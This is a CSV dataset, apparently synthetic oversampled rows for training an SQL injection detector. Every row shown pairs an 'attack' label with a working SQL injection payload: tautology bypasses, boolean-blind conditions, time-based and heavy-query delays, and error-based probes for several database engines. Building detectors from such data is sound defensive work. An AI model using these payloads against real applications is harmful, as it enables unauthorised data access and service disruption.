id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000364,attack,boolean,"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R003621,0.34660868948539897
SMOTE_000365,attack,boolean,"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R002735,0.10148339291665393
SMOTE_000366,attack,boolean,-8187'   )    )     )   or 1698  =  2823#,nearest_attack_euclidean,R001258,0.01064942800041163
SMOTE_000367,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001596,0.1651607689238632
SMOTE_000368,attack,boolean,1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,nearest_attack_euclidean,R002665,0.212926618818993
SMOTE_000369,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R002998,1.0262614257002385
SMOTE_000370,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002313,0.5488241628878078
SMOTE_000371,attack,boolean,"1"" where 4652  =  4652 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002108,0.03125819629808049
SMOTE_000372,attack,boolean,"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",nearest_attack_euclidean,R001970,0.1626382376269915
SMOTE_000373,attack,boolean,"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002046,0.12977653084686047
SMOTE_000374,attack,boolean,"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001243,0.03909301190476338
SMOTE_000375,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000103,0.003705264286494324
SMOTE_000376,attack,boolean,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000608,0.42742871454046744
SMOTE_000377,attack,boolean,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000044,1.0834238443634223
SMOTE_000378,attack,boolean,-2960' or 2163  =  3143--,nearest_attack_euclidean,R001100,2.0647654623614278e-07
SMOTE_000379,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R001325,0.2104966678713297
SMOTE_000380,attack,boolean,-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,nearest_attack_euclidean,R002429,0.6675961499601628
SMOTE_000381,attack,boolean,select * from users where id  =  1 <@.. or 1  =  1 -- 1,nearest_attack_euclidean,R000249,0.08045169269448099
SMOTE_000382,attack,boolean,1%'   )    )     )   and 3916  =  6327--,nearest_attack_euclidean,R000963,0.8440768596532309
SMOTE_000383,attack,boolean,"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002480,0.27169996792534257
SMOTE_000384,attack,boolean,1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,nearest_attack_euclidean,R001959,0.04301741556563435
SMOTE_000385,attack,boolean,1'  )   and   (  3020  =  3020  )  *6703 and   (  'lhfa'  =  'lhfa,nearest_attack_euclidean,R003451,0.04518431788241927
SMOTE_000386,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002960,0.14033028125636263
SMOTE_000387,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R001303,0.3128689584477161
SMOTE_000388,attack,boolean,"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002133,0.12253661168600806
SMOTE_000389,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R002453,0.9808048487187023
SMOTE_000390,attack,boolean,"-1597"" where 5933  =  5933 or 3038  =  3038",nearest_attack_euclidean,R000907,1.2226396297441824
SMOTE_000391,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000976,0.7470985652501616
SMOTE_000392,attack,boolean,"1'||  (  select 'vwop' where 8536  =  8536 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000640,0.4447879989223388
SMOTE_000393,attack,boolean,-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R002820,0.4101176097933794
SMOTE_000394,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000410,0.15071867893704977
SMOTE_000395,attack,boolean,"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002628,0.04385936389369565
SMOTE_000396,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R001366,0.29122553665644973
SMOTE_000397,attack,boolean,"1  )   and make_set  (  1559  =  4863,4863  )  ",nearest_attack_euclidean,R002428,0.06452987467624183
SMOTE_000398,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",nearest_attack_euclidean,R001435,0.17508027781858437
SMOTE_000399,attack,boolean,"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001941,0.3251196745944951
SMOTE_000400,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000052,0.27058990889289325
SMOTE_000401,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003522,0.18565724447209106
SMOTE_000402,attack,boolean,"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001688,0.5421725543302448
SMOTE_000403,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001709,0.0933119268096212
SMOTE_000404,attack,boolean,"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",nearest_attack_euclidean,R001125,0.2253209342297488
SMOTE_000405,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'fnon' like 'fnon",nearest_attack_euclidean,R000974,0.15201162669024493
SMOTE_000406,attack,boolean,"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R000732,0.14329366071897467
SMOTE_000407,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R002370,0.05332230544899035
SMOTE_000408,attack,boolean,1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--,nearest_attack_euclidean,R000590,0.020612293483411624
SMOTE_000409,attack,boolean,"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",nearest_attack_euclidean,R000705,0.028406058198301352
SMOTE_000410,attack,boolean,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",nearest_attack_euclidean,R001402,0.08322423355268603
SMOTE_000411,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000034,0.021161695441484777
SMOTE_000412,attack,boolean,-8187'   )    )     )   or 1698  =  2823#,nearest_attack_euclidean,R001258,0.0008931123376517767
SMOTE_000413,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000931,0.20342240509602683
SMOTE_000414,attack,boolean,-9100  )   or 8792  =  9550--,nearest_attack_euclidean,R003333,0.0322918902654471
SMOTE_000415,attack,boolean,"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",nearest_attack_euclidean,R001905,0.1816720247573291
SMOTE_000416,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002773,0.008567218413427077
SMOTE_000417,attack,boolean,"-8013%"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R002770,0.15394016788219764
SMOTE_000418,attack,boolean,"admin"" or ""1""  =  ""1",nearest_attack_euclidean,R000192,0.5755986041645613
SMOTE_000419,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R001067,0.06782345532448168
SMOTE_000420,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000915,0.8166470277591487
SMOTE_000421,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001529,0.0433507642162477
SMOTE_000422,attack,boolean,"-4639""   )    )     )   or 8550  =  9348",nearest_attack_euclidean,R001979,0.009017157837940281
SMOTE_000423,attack,boolean,1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000965,0.12723746882364895
SMOTE_000424,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R003608,0.25487299265675833
SMOTE_000425,attack,boolean,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",nearest_attack_euclidean,R002641,0.553833344526255
SMOTE_000426,attack,boolean,"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002637,0.03357798274949678
SMOTE_000427,attack,boolean,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R003511,0.27469904771664966
SMOTE_000428,attack,boolean,-3431%'  )   or 9323  =  9323#,nearest_attack_euclidean,R000474,0.4684586106793818
SMOTE_000429,attack,boolean,"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002277,0.20923177272827675
SMOTE_000430,attack,boolean,"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat",nearest_attack_euclidean,R000771,0.07878743045686308
SMOTE_000431,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R003339,0.1897263258423081
SMOTE_000432,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R002740,0.38686254928173824
SMOTE_000433,attack,boolean,end and 'blit'  =  'blit,nearest_attack_euclidean,R000571,0.025103799180414197
SMOTE_000434,attack,boolean,"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",nearest_attack_euclidean,R003212,0.2918627762797743
SMOTE_000435,attack,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002005,0.1570588710760317
SMOTE_000436,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000334,0.4025837251262231
SMOTE_000437,attack,boolean,1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo,nearest_attack_euclidean,R003622,0.3196266754837055
SMOTE_000438,attack,boolean,1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,nearest_attack_euclidean,R000799,0.02025547909491253
SMOTE_000439,attack,boolean,"1'   )    )    as owcw where 1107  =  1107 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002045,0.03878009587590532
SMOTE_000440,attack,boolean,-5137  )   or 9323  =  9323#,nearest_attack_euclidean,R000359,0.000611671693218115
SMOTE_000441,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000844,0.7693113376983127
SMOTE_000442,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002717,0.08825705881668697
SMOTE_000443,attack,boolean,1%'   )    )     )   and 2444  =  9282#,nearest_attack_euclidean,R003557,0.25559613713596285
SMOTE_000444,attack,boolean,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",nearest_attack_euclidean,R000700,0.1556701769744121
SMOTE_000445,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R002173,0.41783183352291453
SMOTE_000446,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R001509,0.14723174063108774
SMOTE_000447,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R001283,0.19290742404495245
SMOTE_000448,attack,boolean,"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",nearest_attack_euclidean,R000379,0.5100181418324985
SMOTE_000449,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R003490,0.7103823270171733
SMOTE_000450,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",nearest_attack_euclidean,R000819,0.13405455816235265
SMOTE_000451,attack,boolean,"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",nearest_attack_euclidean,R003320,0.282564829298055
SMOTE_000452,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",nearest_attack_euclidean,R002822,0.9165296453185542
SMOTE_000453,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,0.0
SMOTE_000454,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",nearest_attack_euclidean,R000578,0.04807778336575249
SMOTE_000455,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R003133,0.07034465267479184
SMOTE_000456,attack,boolean,1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R001028,0.1291550205988746
SMOTE_000457,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000731,0.11823478942403895
SMOTE_000458,attack,boolean,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003168,0.13979486398884716
SMOTE_000459,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R001366,0.17193645060494675
SMOTE_000460,attack,boolean,"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",nearest_attack_euclidean,R001701,0.012926096701299586
SMOTE_000461,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R002724,0.4619597746621393
SMOTE_000462,attack,boolean,or 1  =  1/*,nearest_attack_euclidean,R000018,0.17107272002678353
SMOTE_000463,attack,boolean,"1""   )    )     )   and 5429  =  9596",nearest_attack_euclidean,R002120,0.018395775715313433
SMOTE_000464,attack,boolean,"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002184,0.1497927169756362
SMOTE_000465,attack,boolean,"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R000941,0.4444600887362783
SMOTE_000466,attack,boolean,"admin"" or 1  =  1#",nearest_attack_euclidean,R000026,1.4126896180120072
SMOTE_000467,attack,boolean,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R003419,0.1214505539279547
SMOTE_000468,attack,boolean,-6757'   )    )     )   or 4524  =  3696,nearest_attack_euclidean,R001740,0.06377194806202259
SMOTE_000469,attack,boolean,"-2067"" or 3038  =  3038",nearest_attack_euclidean,R002081,2.0647654623614278e-07
SMOTE_000470,attack,boolean,"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",nearest_attack_euclidean,R000409,0.10619849761997821
SMOTE_000471,attack,boolean,"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R002158,0.16840115893480298
SMOTE_000472,attack,boolean,-2100' where 9260  =  9260 or 3038  =  3038,nearest_attack_euclidean,R000586,1.2272585374300262
SMOTE_000473,attack,boolean,"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",nearest_attack_euclidean,R001123,0.12213650017000714
SMOTE_000474,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000979,0.10251149200867708
SMOTE_000475,attack,boolean,"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000672,0.1281637735155422
SMOTE_000476,attack,boolean,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",nearest_attack_euclidean,R003450,0.0394940217018743
SMOTE_000477,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002284,0.46258589734320144
SMOTE_000478,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001442,0.09297097735060127
SMOTE_000479,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000833,0.2854206715897209
SMOTE_000480,attack,boolean,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",nearest_attack_euclidean,R003643,0.18842884160156223
SMOTE_000481,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000052,0.6970267118287786
SMOTE_000482,attack,boolean,-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',nearest_attack_euclidean,R002232,2.4966022884381786e-05
SMOTE_000483,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R002153,0.15186555976178634
SMOTE_000484,attack,boolean,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",nearest_attack_euclidean,R003429,0.04327388183883596
SMOTE_000485,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002773,0.1284732070433824
SMOTE_000486,attack,boolean,"1%'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000808,1.0939199249399296
SMOTE_000487,attack,boolean,"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000398,0.0627627476471198
SMOTE_000488,attack,boolean,"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002109,0.1787430091585723
SMOTE_000489,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000378,0.26619295844928154
SMOTE_000490,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R003468,0.2022452634499599
SMOTE_000491,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",nearest_attack_euclidean,R003091,0.08466916247251838
SMOTE_000492,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R002359,0.16065048429088757
SMOTE_000493,attack,boolean,"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002184,0.12534220275329327
SMOTE_000494,attack,boolean,"1%""   )    )    and 4595  =  4595#",nearest_attack_euclidean,R001160,0.13140986760897577
SMOTE_000495,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000230,0.36702356984713125
